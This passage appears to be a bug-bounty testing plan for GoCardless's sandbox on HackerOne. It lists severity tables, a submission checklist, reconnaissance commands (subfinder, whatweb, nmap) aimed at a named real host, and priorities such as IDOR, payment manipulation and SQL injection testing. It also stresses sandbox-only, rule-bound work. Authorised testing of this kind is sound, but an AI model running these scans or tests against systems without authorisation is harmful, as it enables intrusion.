- Video PoC: [link]
- Burp request/response: [attached]
```

### Severity Guidelines

| Severity | Examples |
|----------|----------|
| **Critical** | Account takeover, privilege escalation to admin, payment manipulation, sensitive data exposure |
| **High** | IDOR on sensitive data, SQL injection, stored XSS, business logic flaws |
| **Medium** | Reflected XSS, CSRF on sensitive actions, information disclosure |
| **Low** | Security misconfigurations with limited impact |
| **Info** | Interesting findings without direct security impact |

### Submission Checklist

Before submitting:
- [ ] Clear, detailed title
- [ ] Complete steps to reproduce
- [ ] Working proof of concept
- [ ] Impact clearly explained
- [ ] Tested in sandbox environment
- [ ] Screenshots/videos attached
- [ ] Not a duplicate (search existing reports)
- [ ] Not in out-of-scope list
- [ ] Remediation suggestions provided

---

## 🎯 Quick Start (Execute Now)

```bash
# ============================================
# DAY 1: SETUP & RECON
# ============================================

# Step 1: Create workspace
cd ~
mkdir -p gocardless-pentest/{recon,scans,screenshots,notes,exploits,reports}
cd gocardless-pentest

# Step 2: Start passive recon
subfinder -d gocardless.com -o recon/subdomains.txt &
whatweb manage-sandbox.gocardless.com | tee recon/tech.txt &
nmap -sV -p 80,443 manage-sandbox.gocardless.com -oA scans/quick-scan &

# Step 3: While scans run, register account
echo "1. Get HackerOne alias from profile settings" > notes/account-setup.txt
echo "2. Register at: https://manage-sandbox.gocardless.com/signup" >> notes/account-setup.txt
echo "3. Company name: Bug Bounty" >> notes/account-setup.txt

# Step 4: Read documentation
firefox \
  "https://gocardless.com/guides/getting-started/" \
  "https://developer.gocardless.com/" \
  &

# Step 5: Wait for scans to complete
wait

# Step 6: Review results
cat recon/subdomains.txt | grep -i sandbox
cat recon/tech.txt

# ============================================
# DAY 2: MANUAL MAPPING
# ============================================

# Start Burp Suite
burpsuite &

# Configure browser proxy (127.0.0.1:8080)
# Browse entire application
# Map all features
# Document in notes/feature-map.md

# ============================================
# DAY 3: VULNERABILITY TESTING
# ============================================

# Priority 1: IDOR Testing
# - Create 2 test accounts
# - Capture all API requests
# - Test access control on all resources

# Priority 2: Business Logic
# - Test payment manipulation
# - Test refund abuse
# - Test subscription bypass

# Priority 3: Injection
# - SQL injection with SQLmap
# - XSS with Dalfox
# - Command injection manual

# ============================================
# ONGOING: DOCUMENTATION
# ============================================

# Log all activities
echo "## $(date)" >> notes/testing-log.md
echo "### Activities:" >> notes/testing-log.md
echo "- " >> notes/testing-log.md

# Screenshot everything
# Save all Burp requests/responses
# Document findings immediately
```

---

## 📊 Expected Timeline

| Phase | Duration | Activities |
|-------|----------|------------|
| Setup | 2-4 hours | Account creation, tool setup, documentation review |
| Recon | 1-2 days | Passive + active reconnaissance, mapping |
| Manual Testing | 3-5 days | Feature exploration, business logic understanding |
| Vulnerability Testing | 5-10 days | Systematic testing of all vulnerability types |
| Deep Dive | 3-5 days | Advanced exploitation, chaining vulnerabilities |
| Reporting | Ongoing | Document findings as you discover them |

**Total Estimated Time:** 2-3 weeks for comprehensive testing

---

## 🏆 Success Metrics

### High-Value Findings (Prioritize)
1. ✅ Critical business logic flaws (payment manipulation)
2. ✅ Account takeover vulnerabilities
3. ✅ Privilege escalation
4. ✅ IDOR on sensitive resources
5. ✅ SQL injection on critical endpoints

### Medium-Value Findings
6. ✅ Stored XSS
7. ✅ Authentication bypass
8. ✅ API authorization issues
9. ✅ Session management flaws
10. ✅ CSRF on critical actions

### Lower-Value Findings
11. ✅ Reflected XSS
12. ✅ Information disclosure
13. ✅ Security misconfigurations
14. ✅ Rate limiting issues on auth

---

## 📚 Resources

### Documentation
- HackerOne Platform: https://hackerone.com
- GoCardless Developer Docs: https://developer.gocardless.com/
- Getting Started: https://gocardless.com/guides/getting-started/
- Bank Account Data: https://developer.gocardless.com/bank-account-data/

### Testing Guides
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- HackerOne Resources: https://www.hackerone.com/resources

### Wordlists
- SecLists: https://github.com/danielmiessler/SecLists
- FuzzDB: https://github.com/fuzzdb-project/fuzzdb
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings

---

## 📞 Support

### Issues or Questions?
- HackerOne Support: support@hackerone.com
- Program Page: [Check HackerOne for GoCardless program]
- Do NOT contact GoCardless directly - use HackerOne platform

---

## ⚠️ Final Reminders

1. ✅ **Use sandbox only** - Production testing requires approval
2. ✅ **HackerOne alias** - Always use for test accounts
3. ✅ **Document everything** - Screenshots, requests, responses
4. ✅ **Test responsibly** - Don't cause service disruption
5. ✅ **No data theft** - Don't access/store real customer data
6. ✅ **Report promptly** - Submit findings as soon as verified
7. ✅ **Be patient** - Wait for triage before retest
8. ✅ **Stay ethical** - Follow rules of engagement strictly

---

## 📈 Progress Tracker

### Current Status
- [ ] Phase 1: Setup & Reconnaissance
- [ ] Phase 2: Manual Mapping
- [ ] Phase 3: Vulnerability Testing
- [ ] Phase 4: Deep Dive & Exploitation
- [ ] Phase 5: Reporting & Followup

### Findings Summary
```
Critical: 0
High: 0
Medium: 0
Low: 0
Info: 0

Total Bounty: $0
```

---

## 🎯 Next Actions

**What to do RIGHT NOW:**

1. Get your HackerOne email alias
2. Register sandbox account at manage-sandbox.gocardless.com
3. Run the reconnaissance commands
4. Browse the application manually
5. Start testing for IDOR vulnerabilities

**Remember:** Quality over quantity. One critical IDOR is better than 100 low-severity findings!

---

*Last Updated: October 27, 2025*  
*Testing Status: Ready to begin*  
*Environment: Kali Linux (WSL)*  
*Target: manage-sandbox.gocardless.com*

---

**Good luck and happy hunting! 🎯🔥**
